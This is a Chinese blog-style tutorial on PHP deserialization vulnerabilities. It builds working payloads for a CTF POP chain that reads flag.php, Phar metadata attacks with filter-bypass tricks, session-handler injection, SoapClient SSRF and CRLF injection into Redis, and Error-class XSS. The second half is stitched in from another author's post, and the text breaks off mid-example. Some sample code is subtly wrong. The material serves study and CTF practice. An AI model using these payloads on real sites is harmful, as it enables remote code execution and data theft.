## PHP反序列化漏洞总结

> 创建: 未知 | 更新: 2026-05-21 | 适用: PHP 5.x / 7.x | ⚠️ 部分图片托管于外部CDN

> 找实习时被问到了相关问题，虽说前前后后还是能答出来，但是感觉有些东西已经忘的差不多了，答的不利索，索性直接写一篇总结博文好了。

### PHP反序列化漏洞概述

PHP反序列化一直是CTF竞赛中的宠儿吧，自己做CTF题目时时常会做到PHP的题目，但凡是PHP的题目，反序列化一般都少不了。

而国内的ThinkPHP、Yii等框架时不时会爆出反序列化利用，相比起Java，PHP更受中小型企业的青睐，快速开发、维护成本低等等特性使其成为一门很优秀的语言。

### PHP反序列化基础

#### PHP类与对象

在学习编程语言时，应该能了解到`类是定义一系列属性和操作的模板`，`对象是类的实例化`。

来看一个简单的例子：

PHP

```
<?php
class Person
{
    public $name;
    public function eat()
    {
        echo $this->name . " eat something..." . "<br>";
    }
    public function sleep()
    {
        echo $this->name . " sleeping..." . "<br>";
    }
    public function __construct($name)
    {
        $this->name = $name;
    }
}

$person = new Person("Zhangsan");
$person->eat();
$person->sleep();
```

其输出为：

BASH

```
Zhangsan eat something...
Zhangsan sleeping...
```

上面的代码非常简单，定义了一个`Person`类，在`Person`类中定义了`name`成员变量和`eat`、`sleep`成员函数。

而后实例化了一个`Person`对象，然后依次调用`eat`和`sleep`函数，进行输出。

#### PHP魔术方法

值得一提的是，几乎所有的高级语言都支持魔术方法，但是叫法不一。

例如python中，`__repr__`、`__item__`等等函数都是魔术方法，在PHP中，常见的魔术方法及其调用机制如下：

| 方法名         | 作用                                                         |
| -------------- | ------------------------------------------------------------ |
| __construct()  | 构造函数，在创建对象时候初始化对象，一般用于对变量赋初值     |
| __destruct()   | 析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用 |
| __toString()   | 当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如echo打印出对象就会调用此方法 |
| __wakeup()     | 使用unserialize时触发，反序列化恢复对象之前调用该方法        |
| __sleep()      | 使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化) |
| __call()       | 在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法 |
| __callStatic() | 在静态上下文中调用不可访问的方法时触发                       |
| __get()        | 读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性） |
| __set()        | 在给不可访问属性赋值时，即在调用私有属性的时候会自动执行     |
| __isset()      | 当对不可访问属性调用isset()或empty()时触发                   |
| __unset()      | 当对不可访问属性调用unset()时触发                            |
| __invoke()     | 当脚本尝试将对象调用为函数时触发                             |
| __clone()      | 克隆对象时调用                                               |
| __set_state()  | 调用var_export时                                             |
| __autoload()   | 实例化一个对象时，如果对应的类不存在，调用该方法             |

其中`__toString`的触发场景由很多，简单的提一下，只要是当作字符串处理时就会调用：

1. echo/print
2. 对象与字符串连接
3. 对象参与字符串格式化
4. 对象与字符串进行==比较
5. 对象作为SQL语句参数绑定时
6. 作为PHP字符串函数参数，如strlen、addslashes
7. 对象作为class_exists参数时

> 顺口提一句，面试时被问到了实例化对象过程中魔术方法的调用顺序，这里实际上个人感觉能说的不多，把常规的魔术方法都说说就行，但是构造和析构肯定是必须提及的。

来看一个简单的样例：

PHP

```
<?php
class Person
{
    private $name;

    public function __wakeup()
    {
        echo "<hr>";
        echo "Call __wakeup";
    }

    public function __construct(String $name)
    {
        $this->name = $name;
        echo "<hr>";
        echo "Call __construct";
    }

    public function __destruct()
    {
        echo "<hr>";
        echo "Call __destruct";
    }

    public function __toString()
    {
        echo "<hr>";
        echo "Call __toString";
        return $this->name;
    }

    public function __set($name, $value)
    {
        echo "<hr>";
        echo "Call __set";
    }

    public function __get($name)
    {
        echo "<hr>";
        echo "Call __get";
    }

    public function __invoke()
    {
        echo "<hr>";
        echo "Call __invoke";
    }
}

$person = new Person("Zhangsan");// __construct
$person->sex = 'Man';	// __set
echo $person->name;	// __get
$s = "Welcome, " . $person;	// __toString
$per_s = serialize($person);	// nothing happen
print_r(unserialize($per_s));	//__wakeup
$person();	// __invoke
// after all, call __destruct
```

对应的输出为：

![image](https://evalexp.top/p/64706/image-20220506124430759.png)

参照代码应该不难理解。

#### PHP的序列化与反序列化

##### 序列化

在开发过程中，将对象或者数组之类的数据进行存储是一个十分常见的情况。

在这种需求下，序列化对象与反序列化几乎是刚需，PHP提供的常规序列化相关的方式有：

- serialize、unserialize、json_encode、json_decode

来看个序列化的样例：

PHP

```
<?php
class Obj
{
    public $property1 = 'ppt1';
    private $property2 = 'ppt2';
    protected $property3 = 'ppt3';

    function func()
    {
    }
}

$o = new Obj();
echo serialize($o);
```

其对应的输出为：

BASH

```
O:3:"Obj":3:{s:9:"property1";s:4:"ppt1";s:14:"Objproperty2";s:4:"ppt2";s:12:"*property3";s:4:"ppt3";}
```

简单说一下序列化的结果，`o:3:"Obj":3`的`o`表示这是一个对象，`3`表示类名长度为3，`"Obj"`表示类名为`Obj`，而后的`3`表示该对象有三个属性，接下来的大括号内的内容就是属性内容，格式为`type:length:value`，`s`表示是一个String类型。

这里应该可以注意到，使用不同修饰符进行修饰的变量，其序列化后的长度和名称发生了变化：

- public：正常长度
- private：长度+类名称+2
- protected：长度+1(*)+2

这里估计有很多人会疑惑这里的+2怎么来的。

将输出结果URL编码后的结果是这样子的：

BASH

```
O%3A3%3A%22Obj%22%3A3%3A%7Bs%3A9%3A%22property1%22%3Bs%3A4%3A%22ppt1%22%3Bs%3A14%3A%22%00Obj%00property2%22%3Bs%3A4%3A%22ppt2%22%3Bs%3A12%3A%22%00%2A%00property3%22%3Bs%3A4%3A%22ppt3%22%3B%7D
```

为了方便观看，只编码关键部分：

BASH

```
O:3:"Obj":3:{s:9:"property1";s:4:"ppt1";s:14:"%00Obj%00property2";s:4:"ppt2";s:12:"%00*%00property3";s:4:"ppt3";}
```

应该可以看到，在类名或者`*`前后都有一个`%00`，这是用于区分划分属性名所设置的，占两个字符。

给出常规序列化的`type`：

| tpye | 含义              |
| ---- | ----------------- |
| a    | array             |
| d    | double            |
| o    | common object     |
| s    | string            |
| O    | class             |
| R    | pointer reference |
| b    | boolean           |
| i    | integer           |
| r    | reference         |
| C    | custom object     |
| N    | null              |
| U    | unicode string    |

##### 反序列化

这里拿刚刚的字符来反序列化：

PHP

```
$data = urldecode('O:3:"Obj":3:{s:9:"property1";s:4:"ppt1";s:14:"%00Obj%00property2";s:4:"ppt2";s:12:"%00*%00property3";s:4:"ppt3";}');
var_dump(unserialize($data));
```

其结果如图：

![image](https://evalexp.top/p/64706/image-20220506131347521.png)

### PHP反序列化漏洞分析

#### POP链

##### 一个简单的反序列化漏洞

来看一个十分简单的案例：

PHP

```
<?php

class Evil
{
    var $code = 'echo "Hello World!";';
    function __destruct()
    {
        @eval($this->code);
    }
}

$obj = unserialize($_GET['data']);
```

这里的代码十分简单，可以看到，代码反序列化了传入的GET参数data，但是代码中存在一个类Evil，可能被恶意利用。

当我们传入的data是`O:4:"Evil":1:{s:4:"code";s:10:"phpinfo();";}`，此时：

![image](https://evalexp.top/p/64706/image-20220506132128300.png)

而其原因是什么呢？

反序列化的对象的code成员实际上是一个`String="phpinfo();"`，在该对象析构时则调用了Eval函数从而执行任意代码。

从这里不难分析出，PHP反序列化漏洞的利用条件：

1. unserialize函数的参数可控
2. 存在一个合适的魔术方法作为`跳板`
3. 能够将程序流程导向恶意流程

##### POP链构造

POP构造最主要是利用魔术方法，然后在魔术方法中调用其他函数，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，这样就可以通过控制反序列化字符串达到利用反序列化漏洞的目的。

##### 技巧性的东西

主要关注POP链可能利用的方法：

PHP

```
命令执行：exec()、passthru()、popen()、system()
文件操作：file_put_contents()、file_get_contents()、unlink()
代码执行：eval()、assert()、call_user_func()
```

大S绕过：

PHP

```
s:4:"user";
// equal
S:4:"use\72";
```

使用大S，后面的字符就支持16进制表示。

如果可以进行文件读取或者其他文件操作，可以考虑使用PHP伪协议。

##### 例子

看一个简单的例子：

PHP

```
<?php
//flag is in flag.php
error_reporting(1);
class Read {
    public $var;
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
    public function __invoke(){
        $content = $this->file_get($this->var);
        echo $content;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file='index.php')
    {
        $this->source = $file;
        echo $this->source.'Welcome'."<br>";
    }
    public function __toString()
    {
        return $this->str['str']->source;
    }

    public function _show()
    {
        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this->source)) {
            die('hacker');
        } else {
            highlight_file($this->source); 
        }

    }

    public function __wakeup()
    {
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $p;
    public function __construct()
    {
        $this->p = array();
    }

    public function __get($key)
    {
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['hello']))
{
    unserialize($_GET['hello']);
}
else
{
    $show = new Show('pop3.php');
    $show->_show();
}
```

从这个例子来看一下这里的pop链构造的技巧。

首先先注意，上面的代码一共有三个类，分别为`Read`、`Show`和`Test`，容易发现在类`Read`中，其`__invoke`方法读取了`$value`路径的文件并显示。

我们的目的是去取得Flag，而题目提示flag在flag.php中，因此我们这里最终利用的肯定是这里的`Read`类的`__invoke`方法了。

在前面的魔术方法总结中提到过，当 一个对象被当成函数执行时，就会调用其`__invoke`方法。

那么接下来去审查一下代码，看看哪个地方将对象作为了函数调用(在PHP中，弱类型会导致这里的寻找过程比较困难，需要耐心)，不难看到，在`Test`类中，其`__get`方法这里，直接将`$this->p`赋给了`$function`，随后调用了`$function`，也就是相当于`return $this->p();`，那么我们只需要控制这里的`$this->p`为`Read`对象。

这里的话，注意到，我们已经连起来了一条链了`Test::__get ==> Read::__invoke`。

那么我们如何去触发`Test::__get`呢？也是前面的魔术方法提到过的，`__get`方法是读取不可访问属性时调用的。去寻找时应该可以发现，在`Show::__toString`中，获取了`$this->str['str']->source`，那么在这里，如果`$this->str['str']`的`source`属性是不可访问属性的话，就会调用其对象的`__get`方法。

那么在这里，就向已经存在的链加上一个：`Show::__toString ==> Test::__get ==> Read::__invoke`。

接下来需要考虑的是，`Show::__toString`是如何调用的呢？

可以注意到，在`Show::__wakeup`中，将`$this->source`视为字符串进行了`preg_match`，这里显然会调用其对应的`__toString`方法，于是构成了：

PHP

```
Show::__wakeup ==> Show::__toString ==> Test::__get ==> Read::__invoke
```

从上面的构造链来看，这就让反序列化时可以让攻击者走向最终读取文件并回显的函数。

接下来看看怎么从上面的链来构造Payload，首先，虽然分析是从后往前进行分析的，但是构造肯定是从前往后构造的，我个人喜欢是先生成所有的对象，再去一一设置成员关系，所以这里肯定是要先去分析这里一共有几个对象。

从上面的构造链来看，三个类，那么至少是三个对象，有没有可能有更多呢？有，在这里需要四个，为什么呢？因为注意看导向到`__toString`方法的前提是，`Show::this->source`也是一个`Show`对象，这才会调用其对应的`__toString`。

首先构造三个对象：

PHP

```
class Read
{
    public $var;
}

class Show
{
    public $source;
    public $str;
}

class Test
{
    public $p;
}

$show = new Show();
$show2 = new Show();
$test = new Test();
$read = new Read();
```

接下来从前往后进行填充数据，首先是`Show`对象，反序列化时会自动调用其`__wakeup`方法，这里会直接导向到它的`source`的`__toString`，那么在`Show::__toString`中呢，访问的是`$this->str['str']->source`，前面分析这里是调用`__get`的点，那么这两个`Show`对象填充起来就没什么问题了。

PHP

```
$show->source = $show2;
$show2->str = array('str' => $test);
```

接下来看`Test`是怎么填充的，注意这里已经是到了`Test::__get`方法，这里只需要将`$this->p`设为一个`Read`对象即可调用`Read::__invoke`，于是：

PHP

```
$test->p = $read;
```

再看最后的`Read`对象，这里就没啥好说的了，直接设置其`$var`即可：

PHP

```
$read->var = 'flag.php';
```

然后组合起来，并且将其进行序列化可以得到：

PHP

```
<?php
class Read
{
    public $var;
}

class Show
{
    public $source;
    public $str;
}

class Test
{
    public $p;
}

$show = new Show();
$show2 = new Show();
$test = new Test();
$read = new Read();

$show->source = $show2;
$show2->str = array('str' => $test);
$test->p = $read;
$read->var = 'flag.php';
echo serialize($show);
// O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";a:1:{s:3:"str";O:4:"Test":1:{s:1:"p";O:4:"Read":1:{s:3:"var";s:8:"flag.php";}}}}s:3:"str";N;}
```

POWERSHELL

```
$ Invoke-WebRequest -Uri http://localhost/ -Method Get -Body @{hello='O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";a:1:{s:3:"str";O:4:"Test":1:{s:1:"p";O:4:"Read":1:{s:3:"var";s:8:"flag.php";}}}}s:3:"str";N;}'} | Select-Object content
Invoke-WebRequest: PD9waHANCiRmbGFnID0gJ0ZMQUd7YzY0MTk5MTY3NGIwMDYzNjdjYTM0MDA3YjM0ODc1NWM1ZmFiMDAyZH0nOw0K
```

解码后就拿到了Flag.php的代码。

##### POP链的总结

上面只是一个最简单的样例，实际上，在ThinkPHP中、Yii中，有很多的类、很多的方法，如何在确定反序列化点存在时，我们可以通过ThinkPHP或者Yii这一框架去直接进行POP链的构造，去直接利用，这才是一个难点。在哪儿有`eval`、`assert`等危险函数，怎么一步一步跳转到这个函数去进一步利用，在海量的代码前面怎么做，这才是难点所在。

#### Phar反序列化

##### Phar概述

Phar的本质是一个压缩文件，反序列化攻击的核心是其中`序列化存储的用户自定义的meta-data`。

##### Phar文件结构

- stub: phar文件标志，必须是以`xxx __HALT_COMPILER();?>`结尾，否则无法识别，`xxx`可自定义
- manifest: phar压缩信息
- content: 被压缩文件的内容
- signature(可空): 签名，末尾处

##### Phar的生成

使用PHP代码即可生成Phar，相当方便，样例如下：

PHP

```
<?php
class Test
{
}

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$obj = new Test();
$obj->name = 'test';
$phar->setMetadata($obj);
$phar->addFromString("flag.php", "flag");

$phar->stopBuffering();
```

> 注意：需要将phar.readOnly设为Off

生成的Phar文件如下：

![image](https://evalexp.top/p/64706/image-20220516140952026.png)

可以看到，这里的`Test`对象设置进去时时经过了序列化的。

##### Phar读取时反序列化meta-data受影响函数

Phar在读取`meta-data`必然会存在一个反序列化过程，用于还原对象，那么这里就容易使用反序列化攻击造成RCE。

受影响的函数列表如下：

| fileatime             | filectime         | file_exists      | file_get_contents  |
| --------------------- | ----------------- | ---------------- | ------------------ |
| **file_put_contents** | **file**          | **filegroup**    | **fopen**          |
| **fileinode**         | **filemtime**     | **fileowner**    | **fileperms**      |
| **is_dir**            | **is_executable** | **is_file**      | **is_link**        |
| **is_readable**       | **is_writable**   | **is_writeable** | **parse_ini_file** |
| **copy**              | **unlink**        | **stat**         | **readfile**       |

相关的一些具体分析可以见[Phar与Stream Wrapper造成PHP RCE的深入挖掘 - zsx’s Blog (zsxsoft.com)](https://blog.zsxsoft.com/post/38)，该文章对于PHP源代码进行了分析，分析了为什么能造成RCE。

上面的表格是没有整理完成的，这里的话，还要下面的方式都可以利用：

- EXIF

  - exif_thumbnail
  - exif_imagetype

- gd

  - imageloadfont
  - imagecreatefrom***

- hash

  - hash_hmac_file
  - hash_file
  - hash_update_file
  - md5_file
  - sha1_file

- file/url

  - get_meta_tags
  - get_headers

- standard

  - getimagesize
  - getimagesizefromstring

- zip

  PHP

  ```
  $zip = new ZipArchive();
  $res = $zip->open('test.zip');
  $zip->extractTo('phar://test.phar/test');
  ```

- Bzip / Gzip

  PHP

  ```
  $z = 'compress.bzip2://phar://test.phar/test';
  $z = 'compress.zlib://phar://test.phar/test'
  ```

- Postgres

  PHP

  ```
  <?php
  $pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
  @$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
  ```

  > 如果使用pgsqlCopyToFile或者pg_trace，需要开启对应的phar写功能

- MySQL

  PHP

  ```
  <?php
  class A {
      public $s = '';
      public function __wakeup () {
          system($this->s);
      }
  }
  $m = mysqli_init();
  mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
  $s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
  $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
  ```

  配置`mysqld`为：

  INI

  ```
  [mysqld]
  local-infile=1
  secure_file_priv=""
  ```

##### 简单的Phar反序列化

假设现在有一个任意文件上传漏洞，并且有一个页面的代码如下：

PHP

```
<?php

class Test
{
    public $data = 'echo "hello world!"';
    function __wakeup()
    {
        eval($this->data);
    }
}
if ($_GET['file']) {
    echo file_exists($_GET['file']);
}
```

那么这样如何利用呢？

结合前面的POP利用，应该不难得出：

PHP

```
<?php
class Test
{
}
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new Test();
$o->data = "echo 'RCE';";
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

上传Phar，并且传入`file=phar://phar.phar`，这就可以完成一次反序列利用。

假如只有图片上传接口时，这个时候我们可以自己在文件中添加对应的头部，这不会影响正常的Phar解析。

例如：

PHP

```
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
```

那如果，现在我们传入的file不允许以phar开头呢？

当然也是有办法的：`file=compress.bzip2://phar://phar.phar`

#### Session反序列化

在开始前，需要简单介绍一下PHP的Session机制。

##### PHP的Session机制

在Web Application中，会话控制或者说会话保持是一个非常重要的操作，也是授权体系的重要需求。

PHP使用`Session_start`创建一个唯一的`Session ID`，并且自动通过HTTP响应头设置其对应的Cookie；创建是在用户请求中的Cookie没有对应的`Session ID`才会创建的。

> 在上面的机制下，用户可以自行设置对应的Session ID。

在Session中，有几个重要的参数：

| 参数                            | 含义                                               |
| ------------------------------- | -------------------------------------------------- |
| session.save_handler            | session保存形式、默认为files                       |
| session.save_path               | session保存路径                                    |
| session.serialize_handler       | session序列化存储所用处理器，默认为PHP             |
| session.upload_progress.cleanup | 一旦读取了所有POST数据，立即清除进度信息。默认开启 |
| session.upload_progress.enabled | 将上传文件的进度信息存在session中。默认开启        |

PHP对于session的处理有不同的Handler，如下：

| Handler       | 存储格式                                     |
| ------------- | -------------------------------------------- |
| php           | 键名+竖线+serialize数据                      |
| php_binary    | 键名的长度对应的ASCII字符+键名+serialize数据 |
| php_serialize | serialize数据                                |

三种handler对应如下代码：

PHP

```
session_start();
$_SESSION['name'] = 'evalexp';
```

其对应的Session文件内容：

| Handler       | Session                         |
| ------------- | ------------------------------- |
| php           | name\|s:7:”evalexp”;            |
| php_binary    | names:7:”evalexp”;              |
| php_serialize | a:1:{s:4:”name”;s:7:”evalexp”;} |

##### Session反序列化的漏洞原因

PHP本身实现的Session是没有问题的，问题出在了开发者使用Session上。如果开发者在存储Session数据和读取Session数据时所使用的Handler不一致，就将导致无法正确地反序列化，从而导致被反序列化攻击。

看一个简单的案例：

PHP

```
$_SESSION['hello'] = '|O:8:"stdClass":0:{}';
```

当使用`php_serialize`进行序列化时，得到的Session如下：

PHP

```
a:1:{s:5:"hello";s:20:"|O:8:"stdClass":0:{}";}
```

如果这个数据使用的Handler为`php`时，注意`php handler`是以`|`分割的，这就导致了不正确的反序列化：

PHP

```
$_SESSION['a:1:{s:5:"hello";s:20:"'] = object(stdClass){}
```

实际利用的话，主要得看被攻击端的设置：

- **session.auto_start**

当这一个选项为On时，开发者应该在Session处理时，在开头加入这样的代码：

PHP

```
if(ini_get('session.auto_start')) {
    session_destroy();
}
```

然后再去自己处理Session，如果没有对应的处理，如下面简单的样例：

PHP

```
// index.php
<?php
if (ini_get('session.auto_start')) {
    session_destroy();
}

ini_set('session.serialize_handler', 'php_serialize');
session_start();

if (isset($_GET['test'])) {
    $_SESSION['test'] = $_GET['test'];
}
```

PHP

```
// test.php
<?php
var_dump($_SESSION);
```

此时我们向`index.php`传入：`test=|O:8:%22stdClass%22:0:{}`，然后再访问`test.php`。

此时得到的结果是这样的：`array(1) { ["a:1:{s:4:"test";s:20:""]=> object(stdClass)#1 (0) { } }`

当上述的设置为Off时，实际上就需要有两个页面指定的处理器不相同时才能完成反序列化攻击。

##### session.upload_progress利用

PHP 5.4以上，PHP为了提供文件上传的基础信息，会在Session文件里存储文件上传的进度。

默认的选项有如下：

- session.upload_progress.enabled = on // 启用上传进度信息记录
- session.upload_progress.cleanup = on // 文件上传结束后，php立即清除session内容
- session.upload_progress.prefix = “upload_progress_”
- session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS”
- session.upload_progress.freq = “1%”
- session.upload_progress.min_freq = “1”

当Name为PHP_SESSION_UPLOAD_PROGRESS(实际上即Name与session.upload_progress.name同名即可)的字段出现在表单中时，PHP就会报告上传进度，并且这个的值时可控的。当PHP检测到字段时，会向Session文件写入一个键值对，其键为prefix+name，其值为我们的值。

所以这就让我们能够向服务器写入一些恶意的字符串，自然可以包含一些恶意的序列化数据，让其反序列化时造成RCE。

> 这里自然也可以通过LFI进行RCE。

#### PHP原生反序列化利用

##### SoapClient

PHP的`SoapClient`类可以创建Soap数据报文，与WSDL接口进行交互，其定义如下：

PHP

```
public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )
```

其类摘要可见[PHP: SoapClient - Manual](https://www.php.net/manual/zh/class.soapclient.php)。

调用其`__call`方法时，可以发送HTTP或者HTTPS请求，从而造成SSRF。

其POC如下：

PHP

```
<?php
$target = 'http://127.0.0.1:12345';
$post_string = 'a=b&flag=aaa';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: xxxx=1234'
);
$b = new SoapClient(null, array('location' => $target, 'user_agent' => 'wupco^^Content-Type: application/x-www-form-urlencoded^^' . join('^^', $headers) . '^^Content-Length: ' . (string)strlen($post_string) . '^^^^' . $post_string, 'uri'      => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^', '%0d%0a', $aaa);
$aaa = str_replace('&', '%26', $aaa);

unserialize(urldecode($aaa))->a();
```

可以看到NC接受到的数据如下：

![image](https://evalexp.top/p/64706/image-20220516164609221.png)

这一个的SSRF只能使用HTTP协议，因此在实战中可能用处不大，但是如果HTTP头部存在CRLF漏洞的话，可以利用该漏洞去访问Redis从而GetShell。

如下面的代码：

PHP

```
$poc = "CONFIG SET dir /root/";
$target = 'http://127.0.0.1:12345';

$soap = new SoapClient(null, array('location' => $target, 'uri' => 'hello^^' . $poc . '^^hello'));

$ser_soap = serialize($soap);
$ser_soap = str_replace('^^', "\n\r", $ser_soap);

unserialize($ser_soap)->hello();
```

可以得到：

![image](https://evalexp.top/p/64706/image-20220516165907038.png)

##### Error/Exception

Error是一个内置类，在PHP7环境下可能导致XSS，因为有一个内置的`__toString`方法

Exception类的原理与Error类一样，但是在PHP5中适用。

例如Error类的利用：

PHP

```
<?php
$error = new Error("<script>alert('XSS');</script>");
$data = serialize($error);

echo unserialize($data);
```

这就引发了XSS注入。

#### 反序列化字符逃逸

在前面的总结里应该都看到过PHP序列化后的字符串，都会以一个Int标注属性的长度，这为解析提供了方便。

字符逃逸的本质实质上和注入差不多，都是通过闭合，让字符逃逸，分为两种情况，分别为字符变多、字符变少（应用于对输入有过滤或者处理的情况）。

##### 字符增多

字符增多就是后端对我们输入的序列化后的字符进行替换称为长度更长的字符。

这个的处理相对简单，修改对应的长度即可，比如说将p替换为了WW，那么就将`s:1:"p"`换成`s:2:"p"`，换完之后长度能够正常反序列化即可。

##### 字符减少

与上面相反，服务端替换为了更短的字符串，这就为我们提供了遍历，只需要利用这一特性往里面加入被替换的字符串，就可以为我们留出自己的恶意串的位置。

# 原理

未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。

在反序列化的过程中自动触发了某些魔术方法。

**漏洞触发条件**：unserialize函数的变量可控，php文件中存在可利用的类，类中有魔术方法

**序列化demo**

```
<?php
class sakura{
    public $a='HY';
    public $b='666';

    public function __wakeup(){
        print $this->a+$this->b;
    }
}
$a = new sakura();
print (serialize($a));
```

[![image-20221209165156822](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209165156822.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209165156822.png)

**序列化数据格式**

[![image-20221209162056383](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/image-20221209162056383.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/image-20221209162056383.png)

# 常用魔术方法总结

一、__construct(构造方法)

```
当类被实例化的时候就会调用
简单来说，就是new一个类的时候，这个方法就会自动执行

<?php
class autofelix 
{
    public function __construct()
    {
        echo '我是类autofelix';
    }
}
 
new autofelix();
 
//即可输出:我是类autofelix
123456789101112131415
```

二、 __destruct(析构方法)

```
当类被销毁时候自动触发
可以使用unset方法触发该方法

<?php
class autofelix 
{
    public function __destruct()
    {
        echo '我准备销毁你了';
    }
}
 
$a = new autofelix();
unset($a);
 
//即可输出:我准备销毁你了
12345678910111213141516
```

三、 __clone(克隆方法)

```
当类被克隆时自动会自动调用

<?php
class autofelix 
{
    public function __clone()
    {
        echo '我克隆了你';
    }
}
 
$a = new autofelix();
clone $a;
 
//即可输出:我克隆了你
123456789101112131415
```

四、__call(非静态调用方法)

```
当要调用的方法不存在或者权限不足时候会自动调用
比如我在类的外部调用类内部的private修饰的方法

<?php
class autofelix 
{
    private function say() 
    {
        echo 'hello, 我是autofelix';
    }
 
    public function __call($name, $arguments)
    {
        echo '你无权调用' . $name . '方法';
        die;
    }
}
 
$a = new autofelix();
$a->say(); //按理说应该报错
 
//即可输出:你无权调用say方法
12345678910111213141516171819202122
```

五、__callStatic(静态调用方法)

```
当要调用的静态方法不存在或者权限不足时候会自动调用
比如我在类的外部调用类内部的private修饰的静态方法

<?php
class autofelix 
{
    private static function say() 
    {
        echo 'hello, 我是autofelix';
    }
 
    public function __callStatic($name, $arguments)
    {
        echo '你无权调用' . $name . '方法';
        die;
    }
}
 
$a = new autofelix();
$a::say(); //按理说应该报错
 
//即可输出:你无权调用say方法
12345678910111213141516171819202122
```

六、__debugInfo(打印方法)

```
该方法会在var_dump()类对象时候被调用
如果没有定义该方法，var_dump()将会打印出所有的类属性

<?php
class autofelix 
{
    public function __debugInfo()
    {
        echo '你看不到我任何信息的~';
    }
}
 
var_dump(new autofelix());
 
//即可输出:你看不到我任何信息的~
123456789101112131415
```

七、__get(获取成员属性方法)

```
通过它可以在对象外部获取私有成员属性

<?php
class autofelix 
{
    private $name = 'autofelix';
 
    public function __get($name)
    {
        if(in_array($name, ['name', 'age'])) {
           echo $this->name;
        } else {
            echo '不是什么东西都能访问的~';
        }
    }
}
 
$a = new autofelix();
$a->name;
 
//即可输出:autofelix
123456789101112131415161718192021
```

八、__isset方法

```
当对不可访问的属性调用isset()或则会empty()时候会被自动调用

<?php
class autofelix 
{
    private $name = 'autofelix';
 
    public function __isset($name)
    {
        if(in_array($name, ['name', 'age'])) {
           echo $this->name;
        } else {
            echo '不是什么东西都能访问的~';
        }
    }
}
 
$a = new autofelix();
isset($a->name);
 
//结果: autofelix
123456789101112131415161718192021
```

九、__set方法

```
给一个未定义的属性赋值时候会被触发

<?php
class autofelix 
{
    public function __set($name, $value)
    {
        echo '你想给' . $name . '赋值' . $value;
    }
}
 
$a = new autofelix();
$a->name = 'autofelix';
 
//结果: 你想给name赋值autofelix;
123456789101112131415
```

十、__invoke方法

```
对象本身不能直接当函数用
如果对象被当作函数调用就会触发该方法

<?php
class autofelix 
{
    public function __invoke()
    {
        echo '你还想调用我?';
    }
}
 
$a = new autofelix();
 
//对象直接当函数调用
$a();
 
//结果: 你还想调用我?
123456789101112131415161718
```

十一、__sleep方法

```
当在类的外部调用serialize()时会自动被调用

<?php
class autofelix 
{
    public function __sleep()
    {
        echo '弄啥嘞~';
    }
}
 
$a = new autofelix();
 
serialize($a);
 
//结果: 弄啥嘞~
12345678910111213141516
```

十二、__toString方法

```
当一个类被当作字符串处理时应该返回什么
这里必须返回一个string类型不然会报致命错误

<?php
class autofelix 
{
    public function __toString()
    {
        return '我是你得不到的对象...';
    }
}
 
$a = new autofelix();
echo $a;
 
//结果: 我是你得不到的对象...
12345678910111213141516
```

十三、__unset方法

```
当对不可访问的属性调用unset()时会被自动调用

<?php
class autofelix 
{
    private $name = 'autofelix';
 
    public function __unset($name)
    {
        echo '想删我? 你也配?';
    }
}
 
$a = new autofelix();
unset($a->name);
 
//结果: 想删我? 你也配?
1234567891011121314151617
```

十四、__wakeup方法

```
当执行unserialize()方法时会被自动调用

<?php
class autofelix 
{
    public function __wakeup()
    {
        echo '又想弄啥嘞~';
    }
}
 
$a = new autofelix();
 
unserialize($a);
 
//结果: 又想弄啥嘞~
12345678910111213141516
```

# 魔术方法的执行顺序

不同的魔术方法的执行顺序是不一样的，我们只需要搞清楚最开始会先执行什么，最后会执行什么就可以了

我们就来探讨下 `__construt`,`__wakeup`,`__destruct`这几个魔术方法的执行顺序

**首先我们来看一下new一个类的时候魔术方法的执行顺序**

```
<?php
class sakura{
    public $a='HY';
    public $b='666';

    public function __construct(){
        print "这是__construct方法\r\n";
    }

    public function __wakeup(){
        print "这是__wakeup方法\r\n";
    }

    public function __destruct(){
        print "这是__destruct方法\r\n";
    }
}
$a = new sakura();
